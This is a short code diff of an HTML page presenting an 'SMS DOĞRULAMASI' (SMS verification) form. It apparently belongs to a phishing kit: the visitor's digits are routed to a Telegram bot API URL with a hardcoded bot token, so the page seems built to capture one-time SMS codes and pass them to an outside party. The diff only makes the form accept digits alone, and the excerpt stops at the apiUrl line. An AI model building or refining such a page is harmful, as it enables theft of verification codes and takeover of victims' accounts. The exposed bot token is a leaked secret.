@@ -55,11 +55,15 @@
     <img id="logo" src="./logo.png" alt="Logo">
     <form id="telegramForm">
         <label for="messageText">SMS DOĞRULAMASI</label>
-        <input type="text" id="messageText" placeholder="" required>
+        <input type="tel" id="messageText" placeholder="" oninput="validateInput(this)" pattern="\d*" required>
         <button type="button" id="submitBtn" onclick="sendMessage()">Gönder</button>
     </form>
 
     <script>
+        function validateInput(input) {
+            input.value = input.value.replace(/\D/g, ''); // Sadece rakamları kabul et
+        }
+
         function sendMessage() {
             var messageText = document.getElementById('messageText').value;
             var apiUrl = 'https://api.telegram.org/bot6310872354:AAEXpycTL7iDBrndrBPpMhr-_aAepxC3VVk/sendMessage';
